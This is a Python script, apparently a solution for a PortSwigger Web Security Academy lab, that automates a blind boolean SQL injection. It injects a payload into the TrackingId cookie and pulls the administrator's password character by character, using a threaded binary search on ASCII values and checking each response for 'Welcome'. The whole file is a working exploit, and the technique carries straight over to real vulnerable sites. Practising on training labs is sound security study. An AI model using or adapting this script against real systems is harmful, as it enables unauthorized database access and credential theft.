import requests
import threading

# Target URL
url = "https://0a82002f037163298054260200ed00d1.web-security-academy.net/"

# Cookies from Burp request
base_tracking_id = "2RSds6nJs7F1soSc"
session_cookie = "JQBEA3UMxk3BtxQ4v3t5TNTdUSRAUSQJ"

# Password array - 20 characters long
password = ['?'] * 20
lock = threading.Lock()

def check_condition(pos, operator, value):
    """Send request and check if 'Welcome' exists in response"""
    tracking_id = (
        f"{base_tracking_id}'+AND+"
        f"(SELECT+ASCII(SUBSTRING(password,{pos},1))+FROM+users+"
        f"WHERE+username='administrator'){operator}{value}--"
    )
    cookies = {
        "TrackingId": tracking_id,
        "session": session_cookie
    }
    try:
        r = requests.get(url, cookies=cookies, timeout=10)
        return "Welcome" in r.text
    except Exception as e:
        print(f"[-] Request failed at pos {pos}: {e}")
        return False

def binary_search_char(pos):
    """Find character at given position using binary search on ASCII range"""
    low, high = 32, 126  # Printable ASCII range
    
    while low <= high:
        mid = (low + high) // 2
        
        if check_condition(pos, ">", mid):
            # Character is in upper half
            low = mid + 1
        elif check_condition(pos, "<", mid):
            # Character is in lower half
            high = mid - 1
        else:
            # Exact character found
            char = chr(mid)
            with lock:
                password[pos-1] = char
                print(f"[+] Position {pos}: '{char}' -> {''.join(password)}")
            return
    
    # Character not found at this position
    password[pos-1] = '?'
    print(f"[-] Position {pos}: not found")

# Launch all 20 positions in parallel threads
threads = []
for pos in range(1, 21):
    t = threading.Thread(target=binary_search_char, args=(pos,))
    threads.append(t)
    t.start()

# Wait for all threads to complete
for t in threads:
    t.join()

print("\n[*] Final Password:", ''.join(password))